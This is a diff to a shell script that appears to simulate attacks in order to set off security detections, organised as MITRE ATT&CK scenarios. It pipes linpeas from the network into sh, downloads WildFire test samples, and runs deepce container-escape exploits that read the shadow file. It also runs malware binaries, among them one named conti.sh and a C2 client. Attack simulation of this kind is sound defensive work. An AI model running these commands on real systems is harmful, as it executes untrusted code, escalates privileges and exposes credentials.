@@ -32,7 +32,7 @@ echo "[+] Executing enumeration script."
 sh enum_script.sh
 sleep 3
 
-echo "[+] Downloading linpeas for further enumeration"
+echo "[+] Downloading linpeas for further enumeration pass to pipe will activate a specific detection"
 wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 sleep 3 
 
@@ -68,6 +68,9 @@ sleep 3
 echo "[+] Changing C2 Client file permissions to executable" 
 chmod +x c2.sh
 sleep 3
+
+wget http://wildfire.paloaltonetworks.com/publicapi/test/pe 
+wget wildfire.paloaltonetworks.com/publicapi/test/elf
 
 # SCENARIO  3 --- MITRE ATT&CK TTP Demonstration Script
 echo "[+] Senario 3 MITTRE ATTACK TTP"
@@ -152,13 +155,12 @@ chmod +x deepce.sh
 ./deepce.sh --no-enumeration --exploit SOCK --shadow
 ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepcechmod +x deepce.sh
 
-
 echo "[+] Calling malware executables"
 #[TODO] Error handeling in this - nil pointer reference in go library # Execution of Malware (suppress errors with `|| true`)
 #./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true 
 ./conti.sh || true 
-./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
-#./c2.sh || true 
+./05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 
+# ./c2.sh || true 
 
 
 # Senario 5 - Scanning and Discovery on network 
